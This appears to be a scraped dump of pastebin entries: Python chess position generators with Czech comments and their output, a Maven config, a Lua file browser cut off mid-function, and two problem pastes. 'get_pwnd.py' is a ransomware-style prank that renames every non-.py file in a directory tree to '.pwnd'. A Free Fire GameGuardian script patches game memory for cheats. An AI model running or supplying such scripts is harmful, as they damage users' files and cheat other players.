initial_pieces = ['K', 'k', 'Q']
unique_positions = generate_chess_positions(initial_pieces)

# Startovn√≠ pozice
start_fen = ""6k1/8/5Q2/6K1/8/8/8/8 w - - 0 1""
POZ = {1: start_fen}
AR = {simplify_fen_string(start_fen): {'used': None, 'to_end': None}}
N = 1
M = 0

while M < N:
    M += 1
    current_fen = POZ[M]
    board = chess.Board(current_fen)
    simplified_current_fen = simplify_fen_string(current_fen)
    
    if AR[simplified_current_fen]['used'] is None:
        AR[simplified_current_fen]['used'] = 1
        for move in board.legal_moves:
            board.push(move)
            POZ2 = board.fen()
            simplified_POZ2 = simplify_fen_string(POZ2)
            
            if simplified_POZ2 not in AR:
                to_end = AR[simplified_current_fen]['to_end']
                if board.is_checkmate():
                    to_end = 1
                elif to_end is not None:
                    to_end += 1
                AR[simplified_POZ2] = {'used': None, 'to_end': to_end}
                
            if AR[simplified_POZ2]['used'] is None:
                N += 1
                POZ[N] = simplified_POZ2
            
            board.pop()  # Vr√°t√≠me tah zpƒõt

# Print the results
print(f""Poƒçet pozic je {N}"")
for i in range(1, N+1):
    fen = POZ[i]
    simplified_fen = simplify_fen_string(fen)
    used = AR[simplified_fen]['used']
    to_end = AR[simplified_fen]['to_end']
    if to_end != None:
        print(f""{i}: {fen}, used: {used}, to_end: {to_end}"")
"
8Q8tXzE2,dalsi kod PK,max2201111,Python,Friday 21st of June 2024 12:56:23 PM CDT,"import chess
from itertools import permutations, combinations

def simplify_fen_string(fen):
    parts = fen.split(' ')
    simplified_fen = ' '.join(parts[:4])  # Zachov√°v√°me pouze informace o pozici
    return simplified_fen

def generate_chess_positions(pieces):
    all_squares = [chess.SQUARES[i] for i in range(64)]
    unique_fens = set()
    
    for squares in combinations(all_squares, len(pieces)):
        for square_perm in permutations(squares):
            board = chess.Board(None)
            board.clear_board()
            for piece, square in zip(pieces, square_perm):
                board.set_piece_at(square, chess.Piece.from_symbol(piece))
            
            # Kontrola platnosti pro tah b√≠l√©ho
            board.turn = chess.WHITE
            if board.is_valid() or board.is_checkmate():
                unique_fens.add(simplify_fen_string(board.fen()))

            # Kontrola platnosti pro tah ƒçern√©ho
            board.turn = chess.BLACK
            if board.is_valid() or board.is_checkmate():
                unique_fens.add(simplify_fen_string(board.fen()))
    
    return unique_fens

# Generov√°n√≠ v≈°ech mo≈æn√Ωch pozic pro zadan√© figury
initial_pieces = ['K', 'k', 'Q']
unique_positions = generate_chess_positions(initial_pieces)

# Startovn√≠ pozice
start_fen = ""6k1/8/5Q2/6K1/8/8/8/8 w - - 0 1""
POZ = {1: start_fen}
AR = {start_fen: {'used': None}}
N = 1
M = 0

while M < N:
    M += 1
    current_fen = POZ[M]
    board = chess.Board(current_fen)
    
    if AR[current_fen]['used'] is None:
        AR[current_fen]['used'] = 1
        for move in board.legal_moves:
            board.push(move)
            POZ2 = board.fen()
            simplified_POZ2 = simplify_fen_string(POZ2)
            
            if simplified_POZ2 not in AR:
                AR[simplified_POZ2] = {'used': None}
                
            if AR[simplified_POZ2]['used'] is None:
                N += 1
                POZ[N] = simplified_POZ2
            
            board.pop()  # Vr√°t√≠me tah zpƒõt

print(f""Poƒçet pozic je {N}"")"
v8e8QZAu,maven repo,marcgruita,XML,Friday 21st of June 2024 12:48:33 PM CDT,"<servers>
    <server>
        <id>gitlab-maven</id>
        <configuration>
            <httpHeaders>
                <property>
                    <name>Private-Token</name>
                    <value>TOKEN</value>
                </property>
            </httpHeaders>
        </configuration>
    </server>
</servers>
<profiles>
    <profile>
        <id>hrevolution</id>
        <activation>
            <activeByDefault>true</activeByDefault>
        </activation>
        <repositories>
            <repository>
                <id>gitlab-maven</id>
                <url>https://gitlab.com/api/v4/projects/54638243/packages/maven</url>
                <releases>
                    <enabled>true</enabled>
                </releases>
                <snapshots>
                    <enabled>true</enabled>
                </snapshots>
            </repository>
        </repositories>
    </profile>
</profiles>"
fR398uSi,get_pwnd,Python253,Python,Friday 21st of June 2024 12:34:12 PM CDT,"#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Filename: get_pwnd.py
# Version: 1.0.0
# Author: Jeoi Reqi

""""""
Description:
    - This script recursively renames all files in a specified directory and its subdirectories.
    - It does this by stripping their existing extensions and appending '.pwnd'.
    - It skips renaming files with a '.py' extension and leaves directory names unchanged.

Requirements:
    - Python 3.x
    - os module

Functions:
    - add_pwnd_extension(directory):
        Recursively renames files by appending '.pwnd' to their base names, excluding '.py' files.

Usage:
    - Ensure Python 3.x is installed.
    - Run the script in a directory where files need to be renamed.
    - The script will rename all files in the current directory and its subdirectories.

Additional Notes:
    - Files with conflicting names will have a numeric suffix added (e.g., filename_1.pwnd).
    - Ensure the script is run with appropriate permissions to rename files.
""""""

import os

def add_pwnd_extension(directory):
    """"""
    Recursively renames all files in the specified directory and its subdirectories by 
    stripping their existing extensions and appending '.pwnd'. 

    Files with a '.py' extension are excluded from renaming. Directory names remain unchanged.

    Args:
    directory (str): The path to the directory where the renaming should begin.

    Returns:
    None
    """"""
    for root, _, files in os.walk(directory):  # Use underscore for the unused 'dirs' variable
        for filename in files:
            if filename.endswith('.py'):
                continue  # Skip .py files

            old_path = os.path.join(root, filename)
            base_filename = os.path.splitext(filename)[0]  # Remove the existing extension
            new_filename = base_filename + '.pwnd'  # Append the new '.pwnd' extension
            new_path = os.path.join(root, new_filename)

            # Check if the new file path already exists and handle conflicts
            counter = 1
            while os.path.exists(new_path):
                new_filename = f""{base_filename}_{counter}.pwnd""
                new_path = os.path.join(root, new_filename)
                counter += 1

            os.rename(old_path, new_path)
            print(f""\nPWND:\n{old_path}\n   --->\t--->\t--->\t-P->\t-W->\t-N->\t-D->\t--->\t--->\t--->\n{new_path}"")

if __name__ == ""__main__"":
    """"""
    Main execution block. Gets the current working directory and initiates the renaming process.
    """"""
    cwd = os.getcwd()
    add_pwnd_extension(cwd)
    print(""\n\n\t\t\t\tYOU HAVE BEEN PWND!\n\n\t\t\tALL YOUR FILES IS BELONG TO US NOW!"")

"
2QWryq7x,kod Petr K,max2201111,Python,Friday 21st of June 2024 12:33:48 PM CDT,"import chess
import random
from itertools import combinations, permutations
from concurrent.futures import ThreadPoolExecutor, as_completed
import time
import threading

def simplify_fen_string(fen):
    parts = fen.split(' ')
    simplified_fen = ' '.join(parts[:4])  # Zachov√°v√°me pouze informace o pozici
    return simplified_fen

def generate_chess_positions(pieces):
    all_squares = [chess.SQUARES[i] for i in range(64)]
    unique_fens = set()
    
    for squares in combinations(all_squares, len(pieces)):
        for square_perm in permutations(squares):
            board = chess.Board(None)
            board.clear_board()
            for piece, square in zip(pieces, square_perm):
                board.set_piece_at(square, chess.Piece.from_symbol(piece))
            
            # Kontrola platnosti pro tah b√≠l√©ho
            board.turn = chess.WHITE
            if board.is_valid() or board.is_checkmate():
                unique_fens.add(simplify_fen_string(board.fen()))

            # Kontrola platnosti pro tah ƒçern√©ho
            board.turn = chess.BLACK
            if board.is_valid() or board.is_checkmate():
                unique_fens.add(simplify_fen_string(board.fen()))
    
    return unique_fens






# Funkce pro kontrolu matu a aktualizaci hodnocen√≠
def evaluate_checkmate(fen):
    board = chess.Board(fen)
    if board.is_checkmate():
        if board.turn == chess.WHITE:
            return {""to_end"": -1000, ""score"": -1}  # B√≠l√Ω je v matu
        else:
            return {""to_end"": 1000, ""score"": 1}  # ƒåern√Ω je v matu
    return {""to_end"": None, ""score"": 0}

# Funkce pro paraleln√≠ zpracov√°n√≠
def process_position(fen, dot_event):
    evaluation = evaluate_checkmate(fen)
    dot_event.set()  # Nastavit ud√°lost pro tisk teƒçky
    return fen, evaluation

# Funkce pro v√Ωpis uplynul√©ho ƒçasu
def print_elapsed_time(stop_event):
    start_time = time.time()
    while not stop_event.is_set():
        time.sleep(1)
        elapsed_time = time.time() - start_time
        days, remainder = divmod(elapsed_time, 86400)
        hours, remainder = divmod(remainder, 3600)
        minutes, seconds = divmod(remainder, 60)
        print(f""\rUplynul√Ω ƒças: {int(days)}d {int(hours):02}h {int(minutes):02}m {int(seconds):02}s"", end='', flush=True)

# Funkce pro tisk teƒçek
def print_dots(dot_event, stop_event):
    while not stop_event.is_set():
        if dot_event.wait(0.1):  # ƒåekat na nastaven√≠ ud√°losti s timeoutem
            print(""."", end='', flush=True)
            dot_event.clear()

# Hlavn√≠ ƒç√°st k√≥du
initial_pieces = ['K', 'k', 'Q']  # M≈Ø≈æete zmƒõnit figury podle pot≈ôeby
unique_positions = generate_chess_positions(initial_pieces)
evaluations = []

print(""Poƒçet unik√°tn√≠ch pozic:"", len(unique_positions))

# Nastaven√≠ a spu≈°tƒõn√≠ vl√°kna pro v√Ωpis ƒçasu
stop_event = threading.Event()
dot_event = threading.Event()
time_thread = threading.Thread(target=print_elapsed_time, args=(stop_event,))
dot_thread = threading.Thread(target=print_dots, args=(dot_event, stop_event))

time_thread.start()
dot_thread.start()

# Paraleln√≠ zpracov√°n√≠ pozic
batch_size = 100  # Zpracovat men≈°√≠ d√°vky paralelnƒõ
with ThreadPoolExecutor(max_workers=16) as executor:
    for i in range(0, len(unique_positions), batch_size):
        batch_positions = list(unique_positions)[i:i + batch_size]
        futures = [executor.submit(process_position, fen, dot_event) for fen in batch_positions]
        for future in as_completed(futures):
            fen, evaluation = future.result()
            evaluations.append({
                ""fen_string"": fen,
                ""to_end"": evaluation[""to_end""],
                ""score"": evaluation[""score""],
                ""parent"": None  # P≈ôid√°n√≠ parent, m≈Ø≈æe b√Ωt aktualizov√°no pozdƒõji, pokud je t≈ôeba
            })
            dot_event.set()  # Nastavit ud√°lost pro tisk teƒçky po dokonƒçen√≠ √∫lohy

# Zastaven√≠ vl√°kna pro v√Ωpis ƒçasu a teƒçek
stop_event.set()
time_thread.join()
dot_thread.join()

# Print results
print()
for evaluation in evaluations:
    fen = evaluation[""fen_string""]
    score = evaluation[""score""]
    to_end = evaluation[""to_end""]
    if to_end != None:
        turn = ""White"" if chess.Board(fen).turn == chess.WHITE else ""Black""
        print(f""FEN: {fen}, Turn: {turn}, Score: {score}, To End: {to_end}"")
"
1fyCvxmn,output petr K,max2201111,Python,Friday 21st of June 2024 12:31:01 PM CDT,"Poƒçet unik√°tn√≠ch pozic: 369860
Uplynul√Ω ƒças: 0d 00h 00m 48s..................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................
FEN: 7k/3Q2K1/8/8/8/8/8/8 b - -, Turn: Black, Score: 1, To End: 1000
FEN: 2k5/2K5/8/8/8/2Q5/8/8 b - -, Turn: Black, Score: 1, To End: 1000
FEN: 8/6Kk/8/6Q1/8/8/8/8 b - -, Turn: Black, Score: 1, To End: 1000
FEN: 8/8/8/6Kk/8/8/3Q4/8 b - -, Turn: Black, Score: 1, To End: 1000
FEN: 8/8/8/8/kK6/8/1Q6/8 b - -, Turn: Black, Score: 1, To End: 1000
FEN: 1Q6/8/8/8/8/6Kk/8/8 b - -, Turn: Black, Score: 1, To End: 1000
FEN: 8/8/8/1Q6/8/8/8/kK6 b - -, Turn: Black, Score: 1, To End: 1000
FEN: 8/8/8/8/7Q/8/5K2/6k1 b - -, Turn: Black, Score: 1, To End: 1000
FEN: 6Q1/4k3/4K3/8/8/8/8/8 b - -, Turn: Black, Score: 1, To End: 1000
FEN: 6Qk/5K2/8/8/8/8/8/8 b - -, Turn: Black, Score: 1, To End: 1000
FEN: 8/8/8/2Q3Kk/8/8/8/8 b - -, Turn: Black, Score: 1, To End: 1000
FEN: 8/8/8/8/8/8/1Q1K4/3k4 b - -, Turn: Black, Score: 1, To End: 1000
FEN: 1K6/k7/3Q4/8/8/8/8/8 b - -, Turn: Black, Score: 1, To End: 1000
FEN: 3Q4/k7/1K6/8/8/8/8/8 b - -, Turn: Black, Score: 1, To End: 1000
FEN: 4K3/4k3/2Q5/8/8/8/8/8 b - -, Turn: Black, Score: 1, To End: 1000
FEN: 8/8/8/8/3Q4/k7/1K6/8 b - -, Turn: Black, Score: 1, To End: 1000
FEN: 8/8/8/8/8/8/1K1Q4/1k6 b - -, Turn: Black, Score: 1, To End: 1000
FEN: 8/8/8/8/8/8/kQ6/2K5 b - -, Turn: Black, Score: 1, To End: 1000
FEN: kK1Q4/8/8/8/8/8/8/8 b - -, Turn: Black, Score: 1, To End: 1000
FEN: 8/5kK1/8/4Q3/8/8/8/8 b - -, Turn: Black, Score: 1, To End: 1000
FEN: 8/1K6/1k6/3Q4/8/8/8/8 b - -, Turn: Black, Score: 1, To End: 1000
FEN: 8/8/8/3Q4/8/8/6K1/7k b - -, Turn: Black, Score: 1, To End: 1000
FEN: 8/6Q1/8/8/8/8/8/6Kk b - -, Turn: Black, Score: 1, To End: 1000
FEN: 8/6Kk/8/8/6Q1/8/8/8 b - -, Turn: Black, Score: 1, To End: 1000
FEN: 8/8/8/8/8/6Q1/6Kk/8 b - -, Turn: Black, Score: 1, To End: 1000
FEN: 8/8/8/6Q1/8/6k1/6K1/8 b - -, Turn: Black, Score: 1, To End: 1000
FEN: 7k/7K/8/7Q/8/8/8/8 b - -, Turn: Black, Score: 1, To End: 1000
FEN: 1k6/1K5Q/8/8/8/8/8/8 b - -, Turn: Black, Score: 1, To End: 1000
FEN: 8/K7/k7/2Q5/8/8/8/8 b - -, Turn: Black, Score: 1, To End: 1000
FEN: 5k2/3Q2K1/8/8/8/8/8/8 b - -, Turn: Black, Score: 1, To End: 1000
FEN: 8/8/3K4/3k4/8/3Q4/8/8 b - -, Turn: Black, Score: 1, To End: 1000
FEN: 6k1/5QK1/8/8/8/8/8/8 b - -, Turn: Black, Score: 1, To End: 1000
FEN: 8/8/8/2Kk1Q2/8/8/8/8 b - -, Turn: Black, Score: 1, To End: 1000
FEN: k7/1KQ5/8/8/8/8/8/8 b - -, Turn: Black, Score: 1, To End: 1000
FEN: 3k4/3K4/4Q3/8/8/8/8/8 b - -, Turn: Black, Score: 1, To End: 1000
FEN: 8/2Kk4/8/4Q3/8/8/8/8 b - -, Turn: Black, Score: 1, To End: 1000
FEN: 8/8/8/8/8/8/1K6/1kQ5 b - -, Turn: Black, Score: 1, To End: 1000
FEN: 8/8/8/3Kk1Q1/8/8/8/8 b - -, Turn: Black, Score: 1, To End: 1000
FEN: 8/8/8/8/8/8/Kk1Q4/8 b - -, Turn: Black, Score: 1, To End: 1000
FEN: 8/8/2K5/2k5/8/2Q5/8/8 b - -, Turn: Black, Score: 1, To End: 1000
FEN: 1Q1k4/8/3K4/8/8/8/8/8 b - -, Turn: Black, Score: 1, To End: 1000
FEN: 5k2/Q4K2/8/8/8/8/8/8 b - -, Turn: Black, Score: 1, To End: 1000
FEN: 8/8/8/1Kk5/8/3Q4/8/8 b - -, Turn: Black, Score: 1, To End: 1000
FEN: 8/8/1Q6/8/8/8/kK6/8 b - -, Turn: Black, Score: 1, To End: 1000
FEN: 5K2/5k2/7Q/8/8/8/8/8 b - -, Turn: Black, Score: 1, To End: 1000
FEN: 2k5/2K5/8/8/8/8/8/2Q5 b - -, Turn: Black, Score: 1, To End: 1000
FEN: 1k6/1Q6/1K6/8/8/8/8/8 b - -, Turn: Black, Score: 1, To End: 1000
FEN: 8/8/8/8/8/5K2/4Q3/4k3 b - -, Turn: Black, Score: 1, To End: 1000
FEN: 8/3Q4/8/4kK2/8/8/8/8 b - -, Turn: Black, Score: 1, To End: 1000
FEN: 1k5Q/8/1K6/8/8/8/8/8 b - -, Turn: Black, Score: 1, To End: 1000
FEN: 8/1Q6/8/8/8/8/1K6/k7 b - -, Turn: Black, Score: 1, To End: 1000
FEN: 8/8/8/8/3Q4/8/1K6/1k6 b - -, Turn: Black, Score: 1, To End: 1000
FEN: 8/k1K5/8/8/Q7/8/8/8 b - -, Turn: Black, Score: 1, To End: 1000
FEN: 8/8/8/8/8/4Q1kK/8/8 b - -, Turn: Black, Score: 1, To End: 1000
FEN: 8/3Q4/8/kK6/8/8/8/8 b - -, Turn: Black, Score: 1, To End: 1000
FEN: 8/3Q4/5k2/5K2/8/8/8/8 b - -, Turn: Black, Score: 1, To End: 1000
FEN: 8/8/8/8/8/4K3/4k3/6Q1 b - -, Turn: Black, Score: 1, To End: 1000
FEN: 8/8/5kK1/8/4Q3/8/8/8 b - -, Turn: Black, Score: 1, To End: 1000
FEN: 8/7Q/8/5K1k/8/8/8/8 b - -, Turn: Black, Score: 1, To End: 1000
FEN: 4k3/4Q3/4K3/8/8/8/8/8 b - -, Turn: Black, Score: 1, To End: 1000
FEN: 8/8/8/8/8/2K5/2k5/4Q3 b - -, Turn: Black, Score: 1, To End: 1000
FEN: 8/8/8/8/8/kK5Q/8/8 b - -, Turn: Black, Score: 1, To End: 1000
FEN: 8/8/8/8/8/5KQk/8/8 b - -, Turn: Black, Score: 1, To End: 1000
FEN: 8/8/8/8/8/5K2/5Q2/5k2 b - -, Turn: Black, Score: 1, To End: 1000
FEN: 7k/6QK/8/8/8/8/8/8 b - -, Turn: Black, Score: 1, To End: 1000
FEN: k1Q5/8/K7/8/8/8/8/8 b - -, Turn: Black, Score: 1, To End: 1000
FEN: 8/8/8/8/kK6/1Q6/8/8 b - -, Turn: Black, Score: 1, To End: 1000
FEN: 4k3/4K3/3Q4/8/8/8/8/8 b - -, Turn: Black, Score: 1, To End: 1000
FEN: 8/8/Q7/kK6/8/8/8/8 b - -, Turn: Black, Score: 1, To End: 1000
FEN: 8/8/8/8/8/8/Q2K4/3k4 b - -, Turn: Black, Score: 1, To End: 1000
FEN: 8/8/5Q2/7k/7K/8/8/8 b - -, Turn: Black, Score: 1, To End: 1000
FEN: k1K5/8/8/8/8/8/Q7/8 b - -, Turn: Black, Score: 1, To End: 1000
FEN: 8/5Q2/7k/7K/8/8/8/8 b - -, Turn: Black, Score: 1, To End: 1000
FEN: 8/8/8/4Q3/8/8/1K6/1k6 b - -, Turn: Black, Score: 1, To End: 1000
FEN: 5k2/5K2/4Q3/8/8/8/8/8 b - -, Turn: Black, Score: 1, To End: 1000
FEN: 8/3K4/3k4/5Q2/8/8/8/8 b - -, Turn: Black, Score: 1, To End: 1000
FEN: 8/6Q1/8/8/6Kk/8/8/8 b - -, Turn: Black, Score: 1, To End: 1000"
u5i2y600,antiban,vip-fran,Lua,Friday 21st of June 2024 12:14:05 PM CDT,"gg.alert('üîò Este Script Sirve Para Cualquier Free Fire üîò','üí• Vale üí•')
function script()
a = gg.multiChoice({
'üóº Localizar Enemigos üóº (Prelogin Error)',
'üëΩ Cabezas Grandes üëΩ (Prelogin Error)',
'üí• Regedit 100 üí• (Prelogin Error)',
'‚úÖ Botiqu√≠n R√°pido En 3 Segundos ‚úÖ (Pantalla De Login Error)',
'‚öΩ Cerrar El Script ‚öΩ'
},nil,'‚ù§Ô∏è Script Creado Por Fran‚Ä¢Hacker‚Ñ¢ ‚ù§Ô∏è')
if a == nil then else
if a [1] then gps() end
if a [2] then reg() end
if a [3] then head() end
if a [4] then med() end
if a [5] then gg.setVisible(true) os.exit() end
end end
function gps()
gg.setRanges(gg.REGION_ANONYMOUS)
gg.searchNumber('h CD 1F F4 BC 00 00 80 3F 85 7B F6 3E', gg.TYPE_BYTE)
gg.getResults(gg.getResultsCount())
gg.editAll('h CD 1F F4 BC 00 00 96 43 85 7B F6 3E', gg.TYPE_BYTE)
gg.clearResults()
gg.searchNumber('h 0E 34 B9 3D 00 00 80 3F 13 13 17 3E', gg.TYPE_BYTE)
gg.getResults(gg.getResultsCount())
gg.editAll('h 0E 34 B9 3D 00 00 96 43 13 13 17 3E', gg.TYPE_BYTE)
gg.clearResults()
end
function reg()
gg.setRanges(gg.REGION_ANONYMOUS)
gg.searchNumber('0.6;0.6;1;3D;15;35;10;20::29', gg.TYPE_FLOAT)
gg.refineNumber('15;35;10;20::13', gg.TYPE_FLOAT)
gg.getResults(gg.getResultsCount())
gg.editAll('25;45;60;80', gg.TYPE_FLOAT)
gg.clearResults()
end
function head()
gg.setRanges(gg.REGION_ANONYMOUS)
gg.searchNumber('h 62 00 6F 00 6E 00 65 00 5F 00 4C 00 65 00 66 00 74 00 5F 00 57 00 65 00 61 00 70 00 6F 00 6E 00', gg.TYPE_BYTE)
gg.getResults(gg.getResultsCount())
gg.editAll('h 62 00 6F 00 6E 00 65 00 5F 00 4E 00 65 00 63 00 6B 00', gg.TYPE_BYTE)
gg.clearResults()
gg.searchNumber('h 23 AA A6 B8 46 0A CD 70', gg.TYPE_BYTE)
gg.getResults(gg.getResultsCount())
gg.editAll('h 23 AA A6 B8 B2 F7 1F A4', gg.TYPE_BYTE)
gg.clearResults()
gg.searchNumber('h 57 27 13 BE C5 26 27 BC 1F 02 81 B3 D6 2D 8B 29 73 4E D6 34 CB 5F 13 BE BA 55 7D 3F 00 00 80 3F 00 00 80 3F 00 00 80 3F', gg.TYPE_BYTE)
gg.getResults(gg.getResultsCount())
gg.editAll('h EC 51 B8 BD 3B 64 29 BD 1F 02 81 B3 D6 2D 8B 29 73 4E D6 34 CB 5F 13 BE BA 55 7D 3F 72 1C C7 3F 72 1C C7 3F 72 1C C7 3F', gg.TYPE_BYTE)
gg.clearResults()
gg.searchNumber('h 7B D5 FE BD 6B F1 AE BC DA 65 8F B3 38 C2 15 2A 1F CD 04 35 42 A6 36 BE 0D E5 7B 3F 01 00 80 3F 01 00 80 3F 00 00 80 3F', gg.TYPE_BYTE)
gg.getResults(gg.getResultsCount())
gg.editAll('h EC 51 B8 BD 3B 64 29 BD DA 65 8F B3 38 C2 15 2A 1F CD 04 35 42 A6 36 BE 0D E5 7B 3F 00 00 C0 3F 00 00 C0 3F 00 00 C0 3F', gg.TYPE_BYTE)
gg.clearResults()
end
function med()
gg.setRanges(gg.REGION_ANONYMOUS)
gg.searchNumber('00r;00r;80r;40r;00r;00r;00r;00r;03r;00r;00r;00r::12', gg.TYPE_BYTE)
gg.getResults(4)
gg.editAll('00r;00r;40r;40r', gg.TYPE_BYTE)
gg.clearResults()
end
while true do if gg.isVisible() then gg.setVisible(false) script() end end"
ZPwQHxKg,finder.lua,crococrystal,Lua,Friday 21st of June 2024 12:10:59 PM CDT,"local component = require(""component"")
local term = require(""term"")
local event = require(""event"")
local filesystem = require(""filesystem"")
local shell = require(""shell"")
local gpu = component.gpu
local io = require(""io"")

-- –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–µ —ç–∫—Ä–∞–Ω–∞
local screenWidth, screenHeight = 110, 30
gpu.setResolution(screenWidth, screenHeight)

-- –ü—Ä–æ–≤–µ—Ä—è–µ–º –∏ –¥–æ–±–∞–≤–ª—è–µ–º –ø—É—Ç–∏ –¥–ª—è –ø–æ–∏—Å–∫–∞ –±–∏–±–ª–∏–æ—Ç–µ–∫
if not package.path:find(""/home/.paste/?.lua"", 1, true) then
    package.path = package.path .. "";/home/.paste/?.lua""
end

if not package.path:find(""/home/.backup/?.lua"", 1, true) then
    package.path = package.path .. "";/home/.backup/?.lua""
end

local json = require(""dkjson"")

-- –¶–≤–µ—Ç–∞ –¥–ª—è —Ç–µ–∫—Å—Ç–∞
local dirColor = 0x74BCEF
local fileColor = 0x56AF60
local hiddenDirColor = 0x868787
local defaultColor = 0xFFFFFF
local warningColor = 0xFF7F7F
local greyColor = 0x808080
local highlightColor = 0xEC79FF
local messageColor = 0xF4FF76

local currentDirectory = ""/home""
local inputBuffer = """"

-- –ü–∞–ø–∫–∏ –¥–ª—è —Ä–µ–∑–µ—Ä–≤–Ω—ã—Ö –∫–æ–ø–∏–π –∏ –ª–æ–≥–æ–≤
local backupDir = ""/home/.backup""
local restoreDir = backupDir .. ""/restore""
local historyFile = backupDir .. ""/history.json""

-- –£–±–µ–¥–∏–º—Å—è, —á—Ç–æ –ø–∞–ø–∫–∏ –¥–ª—è —Ä–µ–∑–µ—Ä–≤–Ω—ã—Ö –∫–æ–ø–∏–π –∏ –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏—è —Å—É—â–µ—Å—Ç–≤—É—é—Ç
if not filesystem.exists(backupDir) then
    filesystem.makeDirectory(backupDir)
end

if not filesystem.exists(restoreDir) then
    filesystem.makeDirectory(restoreDir)
end

-- –§—É–Ω–∫—Ü–∏—è –¥–ª—è —Ä–∏—Å–æ–≤–∞–Ω–∏—è —Ä–∞–º–∫–∏
local function drawFrame()
    term.clear()
    for y = 1, screenHeight do
        gpu.set(0, y, ""‚ñà"")
        gpu.set(screenWidth, y, ""‚ñà"")
    end
    for x = 0, screenWidth do
        gpu.set(x, 1, ""‚ñà"")
        gpu.set(x, screenHeight, ""‚ñà"")
    end
end

-- –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è –∑–∞–≥–æ–ª–æ–≤–∫–∞
local function drawHeader()
    local line1 = "" _______ _____ __   _ ______  _______  ______ ""
    local line2 = "" |______   |   | \\  | |     \\ |______ |_____/ ""
    local line3 = "" |       __|__ |  \\_| |_____/ |______ |    \\_ ""
    gpu.setForeground(highlightColor)
    gpu.set((screenWidth - #line1) // 2, 3, line1)
    gpu.set((screenWidth - #line2) // 2, 4, line2)
    gpu.set((screenWidth - #line3) // 2, 5, line3)
    gpu.setForeground(defaultColor)
end

-- –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è —Å–ø–∏—Å–∫–∞ —Ñ–∞–π–ª–æ–≤ –∏ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–π
local function getFilesAndDirectories(path)
    local entries = {}
    for file in filesystem.list(path) do
        local fullPath = filesystem.concat(path, file)
        table.insert(entries, {name = file, fullPath = fullPath, isDir = filesystem.isDirectory(fullPath)})
    end
    return entries
end

-- –§—É–Ω–∫—Ü–∏—è –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è —Å–æ–≤–ø–∞–¥–µ–Ω–∏–π –≤ –≤–∏–¥–µ —Ç–∞–±–ª–∏—Ü—ã
local function displayMatches(matches, startX, startY, maxColumns)
    local column = 0
    local row = 0
    gpu.setForeground(defaultColor)
    for i, match in ipairs(matches) do
        -- –û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ —Ü–≤–µ—Ç–∞ –≤ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –æ—Ç —Ç–∏–ø–∞ —ç–ª–µ–º–µ–Ω—Ç–∞ (–ø–∞–ø–∫–∞ –∏–ª–∏ —Ñ–∞–π–ª)
        local color = match.isDir and dirColor or fileColor
        gpu.setForeground(color)

        -- –§–æ—Ä–º–∏—Ä–æ–≤–∞–Ω–∏–µ —Å—Ç—Ä–æ–∫–∏ –≤—ã–≤–æ–¥–∞: –ò–º—è —ç–ª–µ–º–µ–Ω—Ç–∞ –∏ –ø–æ–ª–Ω—ã–π –ø—É—Ç—å
        local displayText = string.format(""%s (%s)"", match.name, match.fullPath)
        gpu.set(startX + column * (screenWidth // maxColumns), startY + row, displayText)

        -- –ü–µ—Ä–µ—Ö–æ–¥ –∫ —Å–ª–µ–¥—É—é—â–µ–º—É —Å—Ç–æ–ª–±—Ü—É
        column = column + 1
        if column >= maxColumns then
            column = 0
            row = row + 1
        end
    end
    gpu.setForeground(defaultColor)
end


-- –§—É–Ω–∫—Ü–∏—è –ø–æ–∏—Å–∫–∞ –∏ –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è —Ñ–∞–π–ª–æ–≤
local function findAndDisplayFiles(query)
    local path = ""/home""  -- –ü—É—Ç—å –¥–ª—è –¥–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏–∏, –∏–∑–º–µ–Ω–∏—Ç–µ –Ω–∞ –Ω—É–∂–Ω—ã–π
    local matches = {}
    local entries = getFilesAndDirectories(path)
    for _, entry in ipairs(entries) do
        if entry.name:find(query) then
            table.insert(matches, entry)
        end
    end
    displayMatches(matches, 1, 5, 3)  -- –ü–æ–∫–∞–∑–∞—Ç—å —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã –Ω–∞—á–∏–Ω–∞—è —Å 5 —Å—Ç—Ä–æ–∫–∏, 3 –∫–æ–ª–æ–Ω–∫–∏
end

-- –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è —Å–æ–¥–µ—Ä–∂–∏–º–æ–≥–æ
local function drawContent(directory)
    local entries = getFilesAndDirectories(directory)
    gpu.setForeground(defaultColor)
    gpu.set(5, 7, ""–í—ã–±—Ä–∞–Ω–Ω–∞—è –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—è: "")
    gpu.setForeground(dirColor)
    gpu.set(28, 7, directory)

    local dirCount, fileCount = 0, 0
    local hasDirs, hasFiles = false, false

    for i, entry in ipairs(entries) do
        if entry.isDir then
            hasDirs = true
            local color = string.sub(entry.name, 1, 1) == ""."" and hiddenDirColor or dirColor
            gpu.setForeground(color)
            gpu.set(7 + (dirCount % 4) * 20, 9 + math.floor(dirCount / 4), "" ‚óâ "" .. entry.name)
            dirCount = dirCount + 1
        else
            hasFiles = true
            gpu.setForeground(fileColor)
            gpu.set(7 + (fileCount % 4) * 20, 13 + math.floor(fileCount / 4), "" ‚óâ "" .. entry.name)
            fileCount = fileCount + 1
        end
    end

    if not hasDirs then
        gpu.setForeground(0x6F7CC1)
        gpu.set(7, 9, "" ‚óâ –ü–∞–ø–æ–∫ –Ω–µ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–æ"")
    end

    if not hasFiles then
        gpu.setForeground(0x6FC19A)
